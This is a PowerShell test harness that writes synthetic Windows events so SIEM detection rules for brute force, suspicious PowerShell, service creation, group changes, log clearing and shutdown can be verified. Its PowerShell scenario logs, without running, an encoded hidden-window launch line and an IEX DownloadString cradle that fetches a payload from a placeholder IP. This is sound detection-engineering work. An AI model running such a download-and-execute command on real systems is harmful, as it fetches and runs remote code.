<#
  -------------------------------------------------------------------------
  Generates the event patterns the Windows detections match, so a rule can be
  proven to fire end to end before anyone relies on it in an incident.

  This is a test harness, not an attack tool:

    * events are written with Write-EventLog to a dedicated source in the
      Application log, never forged into the Security log;
    * the PowerShell scenario logs a *string* containing the indicators - it
      never executes a downloaded payload;
    * no service is installed, no registry autorun key is written outside the
      app's own test key, and nothing is encrypted.

  Note the limitation: synthetic events land in the Application log, so they
  prove the SPL logic but not the production rule, which reads Security.
  -UseRealSecurityEvents instead triggers genuine Security events through
  ordinary OS activity - failed logons against a throwaway disabled local
  account - and is what actually validates the deployed rule.

  Run elevated on the Windows endpoint:
      .\simulate_attacks_windows.ps1
      .\simulate_attacks_windows.ps1 -Scenario UC05
  -------------------------------------------------------------------------
#>
[CmdletBinding()]
param(
    [ValidateSet("All","UC01","UC05","UC06","UC12","UC14","UC16","UC19")]
    [string] $Scenario = "All",
    [switch] $UseRealSecurityEvents,
    [string] $LogSource = "SIEMDetectionTest"
)

$ErrorActionPreference = 'Stop'
function Log    ($m) { Write-Host "[+] $m" -ForegroundColor Green }
function Banner ($m) { Write-Host "`n$m" -ForegroundColor White -BackgroundColor DarkBlue }

if (-not ([Security.Principal.WindowsPrincipal] `
        [Security.Principal.WindowsIdentity]::GetCurrent()
      ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Run from an elevated PowerShell session."
}

# Register a dedicated event source so nothing pollutes a real provider.
if (-not [System.Diagnostics.EventLog]::SourceExists($LogSource)) {
    New-EventLog -LogName Application -Source $LogSource
    Log "registered event source '$LogSource' in the Application log"
}

function Emit ($id, $type, $message) {
    Write-EventLog -LogName Application -Source $LogSource `
        -EventId $id -EntryType $type -Message $message
}

# --- UC-01: failed logons --------------------------------------------------
function Invoke-UC01 {
    Banner "UC-01  Windows brute force (8 failed logons, then a success)"
    if ($UseRealSecurityEvents) {
        # Genuine 4625 events: attempt a logon with a bad password against a
        # throwaway local account. No account is modified or locked out.
        $acct = "siem_detect_test"
        if (-not (Get-LocalUser -Name $acct -ErrorAction SilentlyContinue)) {
            $pw = ConvertTo-SecureString (([guid]::NewGuid()).ToString()+"!Aa1") -AsPlainText -Force
            New-LocalUser -Name $acct -Password $pw -Description "detection content detection test" `
                          -AccountNeverExpires | Out-Null
            Disable-LocalUser -Name $acct
            Log "created disabled throwaway account '$acct'"
        }
        $bad = ConvertTo-SecureString "WrongPassword123!" -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential("$env:COMPUTERNAME\$acct", $bad)
        for ($i = 1; $i -le 8; $i++) {
            try {
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c exit" `
                    -Credential $cred -ErrorAction Stop | Out-Null
            } catch { }   # the failure IS the test
            Start-Sleep -Milliseconds 300
        }
        Log "8 real 4625 events generated against the disabled test account"
        Log "remove the account afterwards with: Remove-LocalUser -Name $acct"
    } else {
        for ($i = 1; $i -le 8; $i++) {
            Emit 4625 Warning "EventCode=4625`nAccount_Name=testuser_sim`nSource_Network_Address=198.51.100.77`nLogon_Type=3`nFailure_Reason=Unknown user name or bad password"
        }
        Emit 4624 Information "EventCode=4624`nAccount_Name=testuser_sim`nSource_Network_Address=198.51.100.77`nLogon_Type=3"
        Log "8 synthetic 4625 + 1 synthetic 4624 written to the Application log"
    }
}

# --- UC-05 / UC-16: PowerShell indicators ----------------------------------
function Invoke-UC05 {
    Banner "UC-05 / UC-16  Suspicious PowerShell script block"
    # The indicator string is LOGGED, never invoked. Script Block Logging
    # records this definition verbatim as a real 4104 event, which is exactly
    # what the detection reads - without any download or execution occurring.
    $indicatorText = @'
# detection content detection test - this string is never executed.
powershell.exe -nop -w hidden -ep bypass -enc <base64>
IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload')
[System.Convert]::FromBase64String($blob)
'@
    Emit 4104 Warning "EventCode=4104`nScriptBlockText=$indicatorText`nUserID=$env:USERNAME`nComputer=$env:COMPUTERNAME"

    # Produce a genuine 4104 as well: defining (not calling) a function makes
    # Script Block Logging write the body to the Operational log.
    $null = [scriptblock]::Create(@'
function Test-SIEMDetectionTestDetection {
    # bypass -noprofile downloadstring indicators, inert by construction
    $marker = 'IEX(New-Object Net.WebClient).DownloadString'
    return $marker
}
'@)
    Log "indicator script block logged (defined, never invoked)"
}

# --- UC-06: service creation ----------------------------------------------
function Invoke-UC06 {
    Banner "UC-06  Unauthorized service creation (synthetic event only)"
    Emit 7045 Warning "EventCode=7045`nService_Name=SIEMDetectionTestTestSvc`nService_File_Name=C:\Users\Public\siemlab2_test.exe`nService_Start_Type=auto start`nAccount_Name=LocalSystem"
    Log "7045 event written - no service was actually installed"
}

# --- UC-12: privileged group change ---------------------------------------
function Invoke-UC12 {
    Banner "UC-12  Privileged group membership change (synthetic event only)"
    Emit 4732 Warning "EventCode=4732`nGroup_Name=Administrators`nMember_Name=testuser_sim`nAccount_Name=$env:USERNAME"
    Log "4732 event written - no group membership was changed"
}

# --- UC-14: log tampering --------------------------------------------------
function Invoke-UC14 {
    Banner "UC-14  Log tampering (synthetic event only)"
    # Deliberately NOT calling wevtutil cl - clearing a real log would destroy
    # the very evidence this deployment exists to retain.
    Emit 1102 Warning "EventCode=1102`nsignature=The audit log was cleared`nAccount_Name=testuser_sim`nComputer=$env:COMPUTERNAME"
    Log "1102 event written - no log was actually cleared"
}

# --- UC-19: shutdown -------------------------------------------------------
function Invoke-UC19 {
    Banner "UC-19  System shutdown (synthetic event only)"
    Emit 1074 Information "EventCode=1074`nReason=Operating System: Planned`nAccount_Name=$env:USERNAME`nComputer=$env:COMPUTERNAME"
    Log "1074 event written - the host was not restarted"
}

switch ($Scenario) {
    "All"  { Invoke-UC01; Invoke-UC05; Invoke-UC06; Invoke-UC12; Invoke-UC14; Invoke-UC19 }
    "UC01" { Invoke-UC01 }
    "UC05" { Invoke-UC05 }
    "UC06" { Invoke-UC06 }
    "UC12" { Invoke-UC12 }
    "UC14" { Invoke-UC14 }
    "UC16" { Invoke-UC05 }
    "UC19" { Invoke-UC19 }
}

Banner "Verify on the indexer"
@"
  Synthetic events land in the Application log, so search:
      index=windows sourcetype="WinEventLog:Application" SourceName=$LogSource
      | table _time, EventCode, Message

  Real Security-log events (-UseRealSecurityEvents):
      index=windows sourcetype="WinEventLog:Security" EventCode=4625 Account_Name=siem_detect_test
      | bin _time span=5m | stats count by _time, Account_Name

  Real PowerShell script block events:
      index=windows_audit EventCode=4104 ScriptBlockText="*SIEMDetectionTest*"
      | table _time, Computer, ScriptBlockText

  Fired alerts:
      index=siem_summary rule_id IN ("UC-01","UC-05","UC-06","UC-12","UC-14","UC-16","UC-19")
      | table _time, rule_id, host, user, severity

  Clean-up:
      Remove-EventLog -Source $LogSource
      Remove-LocalUser -Name siem_detect_test   # only if -UseRealSecurityEvents was used
"@ | Write-Host
